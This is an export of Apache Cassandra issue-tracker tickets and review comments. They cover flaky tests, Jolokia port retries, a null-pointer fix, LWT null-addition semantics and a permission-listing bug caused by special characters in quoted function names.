20:11:33,979 tools.jmxutils INFO Port 8778 in use, trying again on 8206
{code};;;","08/Sep/22 14:53;adelapena;Looks good to me, +1;;;","08/Sep/22 14:57;brandon.williams;Thanks, committed.;;;","08/Sep/22 17:27;adelapena;Just found the error in a CI run for another ticket:

[https://app.circleci.com/pipelines/github/adelapena/cassandra/2071/workflows/22bf9aab-96c5-48f5-84d7-f8f0e5358140/jobs/20699/tests]
{code:java}
    def start(self):
        """"""
            Starts the Jolokia agent.  The process will fork from the parent
            and continue running until stop() is called.
            """"""
        port = self.get_port()
        if not port:
>           raise Exception(""Port 8778 still in use on {}, unable to find another available port in range 8000-9000, cannot launch jolokia"".format(socket.gethostname()))
E           Exception: Port 8778 still in use on adf40abbb1fc, unable to find another available port in range 8000-9000, cannot launch jolokia
{code}
The failing class does a much heavier use of Jolokia, with some tests starting and stopping the agent up to 24 times. Maybe we should increase the number of retries?;;;","08/Sep/22 17:38;brandon.williams;Yes, I think we should since it looks like each attempt is using the same seed and 'consuming' the port:
{code}
16:54:28,816 tools.jmxutils INFO Port 8778 in use, trying again on 8347
16:54:31,646 tools.jmxutils INFO Port 8778 in use, trying again on 8347
16:54:33,648 tools.jmxutils INFO Port 8347 in use, trying again on 8675
16:54:36,669 tools.jmxutils INFO Port 8778 in use, trying again on 8347
16:54:38,672 tools.jmxutils INFO Port 8347 in use, trying again on 8675
16:54:40,673 tools.jmxutils INFO Port 8675 in use, trying again on 8610
16:54:43,523 tools.jmxutils INFO Port 8778 in use, trying again on 8347
16:54:45,524 tools.jmxutils INFO Port 8347 in use, trying again on 8675
16:54:47,527 tools.jmxutils INFO Port 8675 in use, trying again on 8610
16:54:49,528 tools.jmxutils INFO Port 8610 in use, trying again on 8401
16:54:52,375 tools.jmxutils INFO Port 8778 in use, trying again on 8347
16:54:54,377 tools.jmxutils INFO Port 8347 in use, trying again on 8675
16:54:56,379 tools.jmxutils INFO Port 8675 in use, trying again on 8610
16:54:58,380 tools.jmxutils INFO Port 8610 in use, trying again on 8401
16:55:00,382 tools.jmxutils INFO Port 8401 in use, trying again on 8731
FAILED
{code}

Increase retries to 50 and remove the sleep?;;;","08/Sep/22 18:05;adelapena;{quote}Increase retries to 50 and remove the sleep?
{quote}
Sounds good. ;;;","08/Sep/22 18:07;brandon.williams;[Done|https://github.com/apache/cassandra-dtest/commit/47f336365c1386180a78cd869fbf5fa63e750f42].;;;","15/Sep/22 13:00;adelapena;Just hit it again [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/2086/workflows/b8d1b02e-dd9e-452d-8fa5-f65e7208e200/jobs/20955]. Only the first failure is due to Jolokia, the others are due to the unrelated CASSANDRA-17891.;;;","15/Sep/22 13:51;brandon.williams;I think that looks more like whatever happened on CASSANDRA-17892 too, but it's not failure to bind.;;;","15/Sep/22 13:59;adelapena;Yes, right, it's a different error. I didn't read it well, apologies for the noise.;;;","15/Sep/22 14:06;e.dimitrova;Actually if you scroll up you will see also this error:
{code:java}
stdout = b""Couldn't start agent for PID 24737\nPossible reason could be that port '8332' is already occupied.\nPlease check the standard output of the target process for a detailed error message.\n"" stderr = None,{code};;;","15/Sep/22 14:07;brandon.williams;It's always the same message.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix potential test flake in MixedModeMessageForwardTest,CASSANDRA-17866,13478849,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,26/Aug/22 16:02,16/Dec/22 21:54,13/Jul/23 08:40,12/Sep/22 17:09,4.0.7,4.1,4.1-beta1,5.0,,,Test/dtest/java,,,,0,,"This test will occasionally fail because there are no guarantees that the messaging service will be connected before the test tries to send the mutation request.

Given that this test is checking that {{FWD_FRM}} is being deserialized correctly, we can just wait until a {{CL.ALL}} request succeeds once to make sure messaging connections are established and then run the insert test.",,jmckenzie,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Sep 08 15:56:36 UTC 2022,,,,,,,All,,,,"0|z183qw:",9223372036854775807,,,,jmeredithco,jonmeredith,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=f65f1237800b5e884309bbb1bb69d1302466ee80",,,,,,,,,Modified unit test,,,,,"08/Sep/22 15:54;jmckenzie;||Item|Link||
|PR|[link|https://github.com/apache/cassandra/pull/1851]|
|JDK8 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/293/workflows/ae7259c3-c62c-47f2-b5e8-1b2cd0fb5fb1]|
|JDK11 CI|[link|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/293/workflows/2069e185-4e60-4c3c-b7c8-a602c06702dd]|;;;","08/Sep/22 15:55;jmckenzie;PR is against 4.0; pretty clean test fix so should merge up to trunk w/out drama. Will double check on each branch.;;;","08/Sep/22 15:56;jonmeredith;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow Release Version to be null,CASSANDRA-17864,13478847,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,26/Aug/22 15:59,16/Dec/22 21:54,13/Jul/23 08:40,12/Sep/22 16:50,4.0.7,4.1,4.1-beta1,5.0,,,Cluster/Gossip,,,,0,,"During node replacement, schema pulls in the {{MigrationCoordinator}} can have null values on the following:
{code}
final String releaseVersion = state.getApplicationState(ApplicationState.RELEASE_VERSION).value;
{code}
We can NPE out right now in certain edge cases.",,e.dimitrova,jmckenzie,marcuse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 12 05:47:14 UTC 2022,,,,,,,All,,,,"0|z183qg:",9223372036854775807,,,,marcuse,,,,Low,,4.0,,"https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=ac25d6929e182af772741c7bc2bda38d03ca4b0f",,,,,,,,,"Trivial change; no new testing warranted.",,,,,"12/Sep/22 05:47;marcuse;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
upsert with adder support is not consistent with numbers and strings in LWT,CASSANDRA-17857,13478493,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,24/Aug/22 21:18,16/Dec/22 21:54,13/Jul/23 08:40,07/Sep/22 01:09,4.1,4.1-beta1,,,,,CQL/Semantics,Feature/Lightweight Transactions,,,0,,"In 4.1 UPDATE name = name + offset support got extended to numbers and strings (not just counters) but the behavior isn’t consistent

Number: throws a error due to Int32Type.add(null, 42) failing
String: returns the non-null updated values

What Postgres does is keeps the value null

{code}
postgres=# create table x (pk int PRIMARY KEY, a int, b text);
CREATE TABLE
postgres=# insert into x (pk, a, b) values(0, null, null);
INSERT 0 1
postgres=# UPDATE x SET a = a + 1 WHERE pk = 0;
UPDATE 1
postgres=# select * from x;
 pk | a | b
----+---+---
  0 |   |
(1 row)
postgres=# UPDATE x SET b = b + 'one' WHERE pk = 0;
ERROR:  operator does not exist: text + unknown
LINE 1: UPDATE x SET b = b + 'one' WHERE pk = 0;
                           ^
HINT:  No operator matches the given name and argument types. You might need to add explicit type casts.
postgres=# UPDATE x SET b = b + CAST('one' as text) WHERE pk = 0;
ERROR:  operator does not exist: text + text
LINE 1: UPDATE x SET b = b + CAST('one' as text) WHERE pk = 0;
                           ^
HINT:  No operator matches the given name and argument types. You might need to add explicit type casts.
{code}",,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,"dcapwell commented on PR #1816:
URL: https://github.com/apache/cassandra/pull/1816#issuecomment-1232198557

   > This is probably still the best outcome, but perhaps we should raise a DISCUSS thread on the mailing list to confirm?
   
   Fair, for my use was I prefer `null + 42 = 42` rather than `null` (matching counter) but it is departing from SQL so should prob be more widely agreed too.


;30/Aug/22 21:41;githubbot;600","maedhroz commented on code in PR #1816:
URL: https://github.com/apache/cassandra/pull/1816#discussion_r959135863


##########
test/distributed/org/apache/cassandra/distributed/test/CASAddTest.java:
##########
@@ -62,6 +65,48 @@ public void testAddition() throws Throwable
         }
     }
 
+    @Test
+    public void testAdditionNotExists() throws Throwable
+    {
+        try (Cluster cluster = init(Cluster.create(3)))
+        {
+            cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk int PRIMARY KEY, a int, b text, undefined blob)"");
+
+            // n = n + value where n = null
+            cluster.coordinator(1).execute(""UPDATE "" + KEYSPACE + "".tbl SET a = a + 1, b = b + 'fail' WHERE pk = 1 IF undefined = NULL"", ConsistencyLevel.QUORUM);

Review Comment:
   nit: If you don't want to resort to using the dummy blob, I think you could rewrite like this:
   
   ```
   cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk int PRIMARY KEY, a int, b text)"");
   
   // n = n + value where n = null
   cluster.coordinator(1).execute(""INSERT INTO "" + KEYSPACE + "".tbl (pk) VALUES (1)"", ConsistencyLevel.QUORUM);
   cluster.coordinator(1).execute(""UPDATE "" + KEYSPACE + "".tbl SET a = a + 1, b = b + 'fail' WHERE pk = 1 IF EXISTS"", ConsistencyLevel.QUORUM);
   assertRows(cluster.coordinator(1).execute(""SELECT * FROM "" + KEYSPACE + "".tbl WHERE pk = 1"", ConsistencyLevel.SERIAL), row(1, null, null));
   ...
   // have cas add defaults when missing
   cluster.coordinator(1).execute(""UPDATE "" + KEYSPACE + "".tbl SET a = a + 1, b = b + 'success' WHERE pk = 1 IF EXISTS"", ConsistencyLevel.QUORUM);
   assertRows(cluster.coordinator(1).execute(""SELECT * FROM "" + KEYSPACE + "".tbl WHERE pk = 1"", ConsistencyLevel.SERIAL), row(1, 1, ""success""));
   ```



;31/Aug/22 03:45;githubbot;600","dcapwell commented on code in PR #1816:
URL: https://github.com/apache/cassandra/pull/1816#discussion_r959754932


##########
test/distributed/org/apache/cassandra/distributed/test/CASAddTest.java:
##########
@@ -62,6 +65,48 @@ public void testAddition() throws Throwable
         }
     }
 
+    @Test
+    public void testAdditionNotExists() throws Throwable
+    {
+        try (Cluster cluster = init(Cluster.create(3)))
+        {
+            cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk int PRIMARY KEY, a int, b text, undefined blob)"");
+
+            // n = n + value where n = null
+            cluster.coordinator(1).execute(""UPDATE "" + KEYSPACE + "".tbl SET a = a + 1, b = b + 'fail' WHERE pk = 1 IF undefined = NULL"", ConsistencyLevel.QUORUM);

Review Comment:
   from a code point of view partition/row not exist looks the same as column not exist... so that should be fine.



;31/Aug/22 15:52;githubbot;600","smiklosovic closed pull request #1816: CASSANDRA-17857: upsert with adder support is not consistent with numbers and strings in LWT
URL: https://github.com/apache/cassandra/pull/1816


;22/Oct/22 11:25;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Unrecoverable Corruption / Loss,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Sep 06 23:51:21 UTC 2022,,,,,,,All,,,,"0|z181k0:",9223372036854775807,,,,benedict,maedhroz,,,Critical,,4.1-alpha1,,https://github.com/apache/cassandra/commit/d25adb498abde240cc162cfe4a9630c01381c7f9,,,,,,,,,new tests,,,,,"30/Aug/22 23:19;dcapwell;Mail thread on this topic: https://lists.apache.org/thread/jy8rodzhxz6zrb4k6trnho2w3bl3kxf1 ;;;","31/Aug/22 03:47;maedhroz;+1 (with a minor comment on the new test);;;","01/Sep/22 19:25;dcapwell;this patch is inline with the major opinion in the thread, but holding off merge until next week; will attempt to merge Monday;;;","06/Sep/22 23:51;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17857-cassandra-4.1-775F48E8-A826-462C-85E2-BC3DC41DF7DF]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17857-cassandra-4.1-775F48E8-A826-462C-85E2-BC3DC41DF7DF]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1908/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17857-trunk-775F48E8-A826-462C-85E2-BC3DC41DF7DF]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17857-trunk-775F48E8-A826-462C-85E2-BC3DC41DF7DF]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1909/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test failure: org.apache.cassandra.tools.StandaloneUpgraderOnSStablesTest.testUpgradeSnapshot,CASSANDRA-17849,13478247,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,adelapena,adelapena,23/Aug/22 15:37,23/Aug/22 23:52,13/Jul/23 08:40,23/Aug/22 23:52,5.0,,,,,,Test/unit,,,,0,,"The test {{org.apache.cassandra.tools.StandaloneUpgraderOnSStablesTest.testUpgradeSnapshot}} is flaky on trunk, [as reported by Butler|https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/org.apache.cassandra.tools/StandaloneUpgraderOnSStablesTest/testUpgradeSnapshot]:
* https://ci-cassandra.apache.org/job/Cassandra-trunk/1287/testReport/org.apache.cassandra.tools/StandaloneUpgraderOnSStablesTest/testUpgradeSnapshot/
* https://ci-cassandra.apache.org/job/Cassandra-trunk/1286/testReport/org.apache.cassandra.tools/StandaloneUpgraderOnSStablesTest/testUpgradeSnapshot/
* https://ci-cassandra.apache.org/job/Cassandra-trunk/1285/testReport/org.apache.cassandra.tools/StandaloneUpgraderOnSStablesTest/testUpgradeSnapshot/

{code}
Failed 1 times in the last 27 runs. Flakiness: 3%, Stability: 96%
Error Message
Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
Stacktrace
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at org.apache.cassandra.anttasks.TestHelper.execute(TestHelper.java:53)
	at java.util.Vector.forEach(Vector.java:1277)
{code}
It seems that the test gets stuck until JUnit timeouts.",,adelapena,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-13010,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 23 23:42:16 UTC 2022,,,,,,,All,,,,"0|z1801k:",9223372036854775807,,,,brandon.williams,smiklosovic,,,Normal,,NA,,https://github.com/apache/cassandra/commit/17810295ca3b05b011a0ff7061d27435b531ea32,,,,,,,,,fixed failing tests,,,,,"23/Aug/22 16:21;adelapena;Git bisect points to CASSANDRA-13010 as the introducer of the test failure.

Its associated commit, [e7c9ac05f99cc8a5ee958169c49326e85ab4b25b|https://github.com/apache/cassandra/commit/e7c9ac05f99cc8a5ee958169c49326e85ab4b25b], consistently breaks CI for the tests, as it can bee seen in [this repeated run|https://app.circleci.com/pipelines/github/adelapena/cassandra/2008/workflows/2233dcbc-f0de-4888-b346-92a5bf1a0649].

Indeed, the pre-commit CI runs provided in CASSANDRA-13010 also hit the failure, [here|https://app.circleci.com/pipelines/github/instaclustr/cassandra/1216/workflows/19d0beb7-310b-4170-8863-608bff7adb40] and [here|https://app.circleci.com/pipelines/github/instaclustr/cassandra/1216/workflows/5ed6064f-f72d-4b44-bd0f-a47885e10de1].

The previous commit, [c4b1c0614e42b4ea2064822d31c28aa5d4f1450a|https://github.com/apache/cassandra/commit/c4b1c0614e42b4ea2064822d31c28aa5d4f1450a], doesn't break CI, as it can bee seen in [this repeated run|https://app.circleci.com/pipelines/github/adelapena/cassandra/2009/workflows/e32acbf3-05e2-4cdb-a60d-154aa4326f78].

The CircleCI config for the repeated runs has been generated with:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=100 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.tools.StandaloneUpgraderOnSStablesTest \
  -e REPEATED_UTEST_METHODS=testUpgradeSnapshot
{code}
In case someone is curious, the full set of bisect runs can be seen [here|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=flaky-testUpgradeSnapshot-trunk-bisect]. They have been generated with [this script|https://gist.github.com/adelapena/35463e5528873224c13f7e2d44a56922], with these arguments:
{code}
git bisect start
git bisect good 2c4eff0006cb583dde163b321680ffbc09f5ed52
git bisect bad 4b20ad797ca42643be77aa7d7cf7e35cf2480813
git bisect run ~/bisect.sh \
  -r origin \
  -b flaky-testUpgradeSnapshot-trunk-bisect \
  -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=100 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.tools.StandaloneUpgraderOnSStablesTest \
  -e REPEATED_UTEST_METHODS=testUpgradeSnapshot
git bisect reset
{code};;;","23/Aug/22 17:56;smiklosovic;Sorry for hijacking this as Brandon is assigned to this but I just found the reason why that whole test class behaves flaky. It is obvious from the PR. Very trivial fix.

https://github.com/apache/cassandra/pull/1812
https://app.circleci.com/pipelines/github/instaclustr/cassandra/1226/workflows/b38415da-be17-48cf-b4c9-36a4068bcc26;;;","23/Aug/22 18:00;brandon.williams;No problem, I hadn't started yet, so thanks for the patch!  +1 assuming CI is happy.;;;","23/Aug/22 23:42;smiklosovic;both j8 and j11 precommit finished without any error
https://app.circleci.com/pipelines/github/instaclustr/cassandra/1227/workflows/7c4a4f5a-2657-4606-b386-a218162820a2
https://app.circleci.com/pipelines/github/instaclustr/cassandra/1227/workflows/18c4dcda-46a4-44a4-aba5-12ffacd770a8;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix incorrect resource name in LIST PERMISSION output,CASSANDRA-17848,13478058,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,yifanc,yifanc,yifanc,22/Aug/22 17:20,06/Dec/22 16:39,13/Jul/23 08:40,06/Dec/22 03:02,3.0.29,3.11.15,4.0.8,4.1.1,5.0,,CQL/Interpreter,,,,0,,"When producing the resource name, it seems to assume that the content in the `[]` is the function's input type, where it could also be part of the function name, as long as it is quoted. Here is an example to reproduce. In cqlsh,

{code:java}
> CREATE FUNCTION test.""admin_created_udf[org.apache.cassandra.db.marshal.LongType]""(input int) RETURNS NULL ON NULL INPUT RETURNS int LANGUAGE java AS 'return 42;';

> LIST EXECUTE OF user;
 role  | username | resource                                | permission
-------+----------+-----------------------------------------+------------
 user  |    user  | <function test.admin_created_udf(long)> |    EXECUTE

(1 rows)
{code}

The input should be ""int"", but in the output, it says ""long"". 

If the content enclosed by ""[]"" is not a valid class, the LIST PERMISSION request always fails for the user with ""ConfigurationException: Unable to find abstract-type class"".

The bug is discovered by Piotr Sarna.",,bereng,samt,yifanc,,,,,,,,,,,,"beobal commented on code in PR #1992:
URL: https://github.com/apache/cassandra/pull/1992#discussion_r1032556992


##########
test/unit/org/apache/cassandra/cql3/validation/entities/UFTest.java:
##########
@@ -1007,4 +1011,21 @@ public void testEmptyString() throws Throwable
         assertRows(execute(""SELECT "" + fNameICC + ""(empty_int) FROM %s""), row(0));
         assertRows(execute(""SELECT "" + fNameICN + ""(empty_int) FROM %s""), row(new Object[]{ null }));
     }
+
+    @Test
+    public void testRejctInvalidFunctionNamesOnCreation()

Review Comment:
   typo: `testRejct...`



##########
test/unit/org/apache/cassandra/cql3/validation/operations/AggregationTest.java:
##########
@@ -2124,4 +2125,20 @@ public void testSumPrecision() throws Throwable
         assertRows(execute(""select sum(v1), sum(v2), sum(v3) from %s;""),
                    row((float) 15.3, 15.3, BigDecimal.valueOf(15.3)));
     }
+
+    @Test
+    public void testRejctInvalidAggregateNamesOnCreation()

Review Comment:
   typo: `testRejct...`



;29/Nov/22 09:46;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,yifanc,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Dec 06 16:39:04 UTC 2022,,,,,,,All,,,,"0|z17yw8:",9223372036854775807,,,,bereng,samt,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/473656c1d53edb998aa60d414221e397797de52b,,,,,,,,,"unit test; ci",,,,,"08/Nov/22 23:48;yifanc;The root cause of the confusing value for the {{resource}} column is located at {{org.apache.cassandra.auth.FunctionResource#fromName}}. The implementation assumes the special characters (i.e. /, [ and ]) are not used in the function name, and uses those characters to parse the encoded function name string read from role_permissions table. 
However, quoted text is allowed as function names. It is permitted to have those characters in the function names, which breaks the parsing logic. 

In addition to the example in the description, it is allowed to create a function with `/` in the name, as long as it is quoted. 
{code:java}
CREATE FUNCTION cql_test_keyspace.""my/amazing/udf""(input int) RETURNS NULL ON NULL INPUT RETURNS int LANGUAGE java AS 'return 42;';
{code}
Once the UDF is created, listing permission on the role breaks since `/` is used to determine if a resource is valid or not. ;;;","09/Nov/22 00:38;yifanc;Basically there are 2 possible solutions. 
1. Reject at the UDF creation when its name contains any of the special character '/', '[' and ']'. Those characters should be rarely needed as part of the function names. It requires to update the disallowed characters list when a new special character is introduced in the future. 
2. Patch the {{FunctionResource#fromName}} implementation to first locate the last `[...]` segment (as the function's argument list) and treat whatever appears before it as the function name. Sounds error-prone. 

I'd lean towards the approach 1. 
[~samt] and [~bereng], wondering what is your preference since you both have touched the method in question. ;;;","09/Nov/22 05:55;bereng;#1 is the obvious preference. The problem is going to be with backwards compatibility. I think we can safely and reasonably argue this is a bug and an accident waiting to happen that needs fixing. It might impact some users obviously but then again, it's a bug in my eyes. Happy to hear more opinions.;;;","09/Nov/22 08:30;samt;I agree, we should apply more strict validation when creating functions/aggregates to prevent this from happening. Unfortunately though, I'm afraid we also have to handle existing cases in the wild, so we may need to do (some of) both #1 and #2.

If actually using functions with these problematic names works, perhaps we can localise a custom parsing implementation to `ListPermissionsStatement`, leave `FunctionResource#fromName` as it is and tighten up the naming rules going forward?  On the other hand, if functions named this way are completely unusable, then backwards compatibility is not such an issue and #1 alone is probably sufficient.;;;","09/Nov/22 18:29;yifanc;The issue is on listing the permissions only. It either parses the stored function name incorrectly or fails to parse. Invoking/using those functions are allowed. 

For example, the below SELECT statement runs just fine (and returns 42 as defined in the function body). 

{code:java}
SELECT a, b, cql_test_keyspace.""admin_created_udf[org.apache.cassandra.db.marshal.LongType]""(a, b) FROM cql_test_keyspace.tbl WHERE a = 1;
{code}

If Cassandra no longer permits creating function with the disallowed characters, the existing function should not be affected. They can still be used like the above example. However, it does not fix the broken output form listing permissions. 

So, as Sam said, we need to do both #1 and #2. 

bq. perhaps we can localise a custom parsing implementation to `ListPermissionsStatement`, leave `FunctionResource#fromName` as it is and tighten up the naming rules going forward?

I think `FunctionResource#fromName` is the right place to have the parsing logic. Maybe I am missing something? ;;;","10/Nov/22 01:26;yifanc;The patch could be like this [https://github.com/apache/cassandra/pull/1992];;;","10/Nov/22 08:56;bereng;I see you mentioned CI but maybe forgot to add the link to the run?;;;","10/Nov/22 19:46;yifanc;I originally wanted to only post the patch.

Here is the link to CI. [https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=CASSANDRA-17848%2Ftrunk];;;","17/Nov/22 23:29;yifanc;Hi [~samt] and [~bereng] , can either of you review? ;;;","18/Nov/22 06:11;bereng;[~yifanc] I looked into it when you posted the PRs and at the first pass It looked ok. But I am busy atm with some perf testing. I have not forgotten, I am just doing other suff but will come back.;;;","25/Nov/22 15:58;samt;+1 modulo a typo in the tests (I left a comment on the PR). We should backport as far as 3.0, though I think that will be trivial.;;;","28/Nov/22 06:17;bereng;I have been looking at this one also. I would only add we'd need to run j11 CI as well, j8 is already green, but +1 otherwise.;;;","28/Nov/22 21:23;yifanc;||Branch||Source||Circle CI||
|cassandra-3.0|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17848-cassandra-3.0-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17848-cassandra-3.0-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|
|cassandra-3.11|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17848-cassandra-3.11-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17848-cassandra-3.11-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|
|cassandra-4.0|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17848-cassandra-4.0-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17848-cassandra-4.0-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|
|cassandra-4.1|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17848-cassandra-4.1-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17848-cassandra-4.1-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17848-trunk-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17848-trunk-CC2B132A-B8D3-4BFC-9DCC-56A4CEABCA33]|;;;","29/Nov/22 06:36;bereng;[~yifanc] I moved it back to 'review in progress'. AFAIK we only move it to 'ready to commit' once we have reviewed all branches, all CI is green and you get the +1 for all branches.

